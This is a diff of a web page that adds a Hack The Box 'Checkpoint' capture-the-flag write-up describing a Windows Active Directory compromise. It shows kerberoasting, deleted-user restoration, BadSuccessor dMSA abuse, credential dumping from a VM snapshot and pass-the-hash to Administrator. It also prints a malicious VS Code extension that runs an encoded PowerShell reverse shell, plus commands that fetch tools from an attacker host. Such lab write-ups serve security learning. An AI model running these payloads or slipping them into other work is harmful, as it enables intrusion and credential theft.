@@ -6,77 +6,298 @@
     <title>Checkpoint • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Checkpoint</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Platform:</strong> HackTheBox</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Status:</strong> Complete</span>
+        <span><strong>Initial credentials:</strong> <code>alex.turner / Checkpoint2024!</code></span>
     </div>
+
+    <h1>Checkpoint — HTB Writeup</h1>
+
+    <h2>🔍 1. Reconnaissance</h2>
+    <pre><code>silent-scan $TARGET
+nmap -sVC -p53,88,135,139,389,445,464,636,3268,3269,5985,9389,49664,49670,49671,49673,49674,49683,49704,54328 $TARGET -oN service</code></pre>
+
+    <p><strong>Relevant output:</strong></p>
+    <pre><code>PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 03:56:23Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
+3269/tcp  open  globalcatLDAPssl?
+5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf            .NET Message Framing
+Service Info: Host: DC01; OS: Windows</code></pre>
+
+    <div class="box warning">
+        <p>Windows Domain Controller. WinRM available on port 5985.</p>
+    </div>
+
+    <h2>📂 2. SMB Enumeration</h2>
+    <pre><code>sudo ntpdate -u $TARGET
+smbmap -H $TARGET -u 'alex.turner' -p 'Checkpoint2024!'</code></pre>
+
+    <h2>👥 3. User and Group Enumeration</h2>
+    <pre><code>enum4linux -u 'alex.turner' -p 'Checkpoint2024!' -a $TARGET
+awk -F'[][]' '{print $2}' users.txt > clean_users.txt</code></pre>
+
+    <h3>BloodyAD — alex.turner group membership</h3>
+    <pre><code>bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
+  get object "alex.turner" --attr memberOf</code></pre>
+    <pre><code>Employees
+IT-Staff</code></pre>
+
+    <h3>BloodyAD — writable objects</h3>
+    <pre><code>bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
+  get writable
+
+bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
+  get writable --otype USER</code></pre>
+    <pre><code>distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
+permission: WRITE</code></pre>
+
+    <div class="box warning">
+        <p>alex.turner has WRITE permissions over <strong>mark.davies</strong>, which is currently in the AD Recycle Bin (Deleted Objects).</p>
+    </div>
+
+    <h2>♻️ 4. Restore Deleted User (mark.davies)</h2>
+    <p>mark.davies exists in the domain but is flagged as deleted under <code>CN=Deleted Objects</code>.</p>
+
+    <pre><code>python3 restore.py</code></pre>
+
+    <h3>Enable the account</h3>
+    <pre><code>bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --host 10.129.23.75 \
+  set object "mark.davies" userAccountControl -v 512</code></pre>
+    <pre><code>[+] mark.davies's userAccountControl has been updated</code></pre>
+
+    <div class="box warning">
+        <p><code>userAccountControl = 512</code> sets the account as a normal, active user.</p>
+    </div>
+
+    <h2>🎣 5. Kerberoasting — mark.davies</h2>
+
+    <h3>Add a fake SPN to mark.davies</h3>
+    <pre><code>bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
+  --host $TARGET \
+  set object "mark.davies" servicePrincipalName \
+  -v "http/checkpoint.htb"</code></pre>
+
+    <h3>Force etype 23 (RC4) for faster cracking</h3>
+    <pre><code>bloodyad -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
+  --host $TARGET \
+  set object "mark.davies" msDS-SupportedEncryptionTypes \
+  -v 4</code></pre>
+
+    <table>
+        <tr><th>Value</th><th>Encryption</th></tr>
+        <tr><td>4</td><td>RC4-HMAC only</td></tr>
+        <tr><td>8</td><td>AES-128</td></tr>
+        <tr><td>16</td><td>AES-256</td></tr>
+        <tr><td>23</td><td>RC4 + AES-128 + AES-256 (DC will prefer AES)</td></tr>
+    </table>
+
+    <h3>Request the TGS</h3>
+    <pre><code>impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' \
+  -dc-ip 10.129.23.75 \
+  -request-user mark.davies \
+  -outputfile hash_rc4.txt</code></pre>
+
+    <h3>Crack with hashcat</h3>
+    <pre><code>hashcat -m 13100 -a 0 hash_rc4.txt /usr/share/wordlists/rockyou.txt --force</code></pre>
+    <pre><code>$krb5tgs$23$*mark.davies$CHECKPOINT.HTB$...:Checkpoint2024!</code></pre>
+
+    <div class="box success">
+        <p><strong>mark.davies password:</strong> <code>Checkpoint2024!</code></p>
+    </div>
+
+    <h2>🚪 6. Access as mark.davies</h2>
+    <pre><code>smbmap -H 10.129.23.75 -u 'mark.davies' -p 'Checkpoint2024!'</code></pre>
+    <pre><code>DevDrop   READ, WRITE   VS Code extensions share — approved .vsix packages (VS Code engine 1.118.0)</code></pre>
+
+    <h2>📦 7. Create a malicious .vsix extension</h2>
+    <pre><code>mkdir evil-ext && cd evil-ext
+mkdir -p .vscode</code></pre>
+
+    <h3>Package.json</h3>
+    <pre><code>{
+  "name": "dev-utils",
+  "displayName": "Dev Utils",
+  "version": "1.0.0",
+  "engines": { "vscode": "^1.118.0" },
+  "activationEvents": ["*"],
+  "main": "./extension.js",
+  "contributes": {}
+}</code></pre>
+
+    <h3>extension.js</h3>
+    <pre><code>const vscode = require('vscode');
+const { exec } = require('child_process');
+
+function activate(context) {
+    exec('powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA5ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=');
+}
+
+function deactivate() {}
+
+module.exports = { activate, deactivate };</code></pre>
+
+    <h3>Install vsce and create extension</h3>
+    <pre><code>npm install -g @vscode/vsce
+vsce package --allow-missing-repository</code></pre>
+
+    <h3>Put the malicious extension in the share</h3>
+    <pre><code>smbclient //$TARGET/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
+  -c "put dev-utils-1.0.0.vsix"
+nc -lvnp 4444</code></pre>
+
+    <h2>🖥️ 8. Windows Enumeration</h2>
+    <pre><code>whoami
+checkpoint\ryan.brooks</code></pre>
+
+    <h3>Upload SharpHound</h3>
+    <pre><code>Invoke-WebRequest -Uri "http://10.10.14.49/SharpHound.exe" -OutFile "$env:TEMP\SharpHound.exe"
+cd $env:TEMP
+.\SharpHound.exe -c All -d CHECKPOINT.HTB</code></pre>
+
+    <h3>Put .zip in the smb share</h3>
+    <pre><code>net use Z: \\10.129.23.75\DevDrop /user:checkpoint.htb\mark.davies Checkpoint2024!
+copy *.zip Z:\bloodhound_data.zip
+dir Z:\
+net use Z: /delete</code></pre>
+
+    <h3>We have generic write in svc_deploy</h3>
+    <pre><code>Get-DomainObjectAcl -Identity svc_deploy | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser -Identity ryan.brooks).objectsid}
+Get-DomainUser -Identity svc_deploy</code></pre>
+
+    <h3>Upload Rubeus</h3>
+    <pre><code>Invoke-WebRequest -Uri "http://10.10.14.49/Rubeus.exe" -OutFile "$env:TEMP\Rubeus.exe"
+cd $env:TEMP</code></pre>
+
+    <h3>Get TGT for ryan</h3>
+    <pre><code>./Rubeus.exe tgtdeleg /nowrap</code></pre>
+
+    <h2>👑 9. BadSuccessor Enumeration</h2>
+    <pre><code>nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor</code></pre>
+    <pre><code>BADSUCCE... 10.129.46.221   389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.46.221 (DC01.checkpoint.htb)
+BADSUCCE... 10.129.46.221   389    DC01             [+] Found 2 results
+BADSUCCE... 10.129.46.221   389    DC01             alex.turner (S-1-5-21-3129162710-3498938529-1807524340-1101), OU=Employees,DC=checkpoint,DC=htb
+BADSUCCE... 10.129.46.221   389    DC01             ryan.brooks (S-1-5-21-3129162710-3498938529-1807524340-1103), OU=DMSAHolder,DC=checkpoint,DC=htb</code></pre>
+
+    <h3>Convert the ticket format</h3>
+    <pre><code>impacket-ticketConverter /tmp/ryan2.kirbi /tmp/ryan2.ccache
+export KRB5CCNAME=ryan.ccache</code></pre>
+
+    <h3>Find Write permissions with ryan</h3>
+    <pre><code>bloodyad -k ccache=ryan.ccache \
+--dc-ip $TARGET \
+--host dc01.checkpoint.htb \
+-d checkpoint.htb \
+get writable --right WRITE</code></pre>
+    <pre><code>distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
+permission: WRITE
+distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+permission: WRITE</code></pre>
+
+    <h2>🔑 10. Create DMSA</h2>
+    <pre><code>export KRB5CCNAME=ryan.ccache
+bloodyad -k ccache=ryan.ccache \
+-u ryan.brooks \
+--dc-ip $TARGET \
+--host dc01.checkpoint.htb \
+-d checkpoint.htb \
+add badSuccessor evilDMSA6 \
+-t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
+--ou "OU=DMSAHolder,DC=checkpoint,DC=htb"</code></pre>
+    <pre><code># svc_deploy hash
+RC4: e16081eb077aca74bdbf8af12af43ac9</code></pre>
+
+    <h2>💾 11. VMBackups Access</h2>
+    <pre><code>export KRB5CCNAME=evilDMSA6_cD.ccache
+nxc smb dc01.checkpoint.htb -k --use-kcache --shares</code></pre>
+
+    <h3>List shares With svc hash</h3>
+    <pre><code>nxc smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares</code></pre>
+
+    <h3>Download all content in VMBackups</h3>
+    <pre><code>smbclient //dc01.checkpoint.htb/VMBackups -U svc_deploy --pw-nt-hash
+cd NightlyBackup_2024-11-01
+cd "memory forensics"
+mget *</code></pre>
+
+    <h2>🔓 12. Dump Creds from vmware snapshot</h2>
+    <pre><code>pipx install volatility3
+export VOL=/home/kali/.local/share/pipx/venvs/volatility3/bin/vol
+vol -f snapshot.vmem windows.registry.hivelist.HiveList
+mkdir dump
+vol -f snapshot.vmem \
+-o dump \
+windows.registry.hivelist.HiveList --dump
+
+impacket-secretsdump \
+-sam dump/registry.SAM.0xc30a3278e000.hive \
+-system dump/registry.SYSTEM.0xc30a2fe38000.hive \
+-security dump/registry.SECURITY.0xc30a32789000.hive \
+LOCAL</code></pre>
+
+    <h2>👑 13. Shell as admin</h2>
+    <pre><code>psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b Administrator@$TARGET
+takeown /F C:\Users\max.palmer\Desktop\root.txt
+icacls C:\Users\max.palmer\Desktop\root.txt /grant SYSTEM:F
+type C:\Users\max.palmer\Desktop\root.txt</code></pre>
+
+    <h2>🧠 Key Takeaways</h2>
+    <ul>
+        <li><strong>AD Recycle Bin:</strong> Deleted users can be restored and abused if permissions allow.</li>
+        <li><strong>Kerberoasting with custom SPN:</strong> Adding a fake SPN to a writable user makes them kerberoastable.</li>
+        <li><strong>VSIX extensions as RCE vector:</strong> VS Code extensions can execute arbitrary code when installed.</li>
+        <li><strong>BadSuccessor dMSA:</strong> Abusing DMSA to get RC4 hash of a service account.</li>
+        <li><strong>Volatility memory forensics:</strong> Extracting credentials from VM snapshots.</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
